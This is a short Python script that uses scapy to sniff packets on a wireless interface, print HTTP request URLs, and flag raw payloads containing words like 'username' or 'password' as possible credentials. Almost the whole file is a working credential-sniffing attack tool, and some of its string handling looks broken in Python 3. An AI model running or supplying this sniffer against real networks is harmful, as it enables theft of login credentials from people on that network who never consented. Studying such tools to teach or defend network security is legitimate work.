#! /usr/bin/env python
import scapy.all as scapy
# from scapy_http import http
from scapy.layers.http import *

def sniff(interface):
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)

def get_url(packet):
    return packet[HTTPRequest].Host + packet[HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname",
                    "user", "login",
                    "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    print(packet)
    if packet.haslayer(HTTPRequest): # if the packet has an HTTP layer
        print(packet)
        url = get_url(packet) # get the URL
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > "
                  + login_info
                  + "\n\n")
sniff("Qualcomm QCA9377 802.11ac Wireless Adapter")
# scapy.show_interfaces()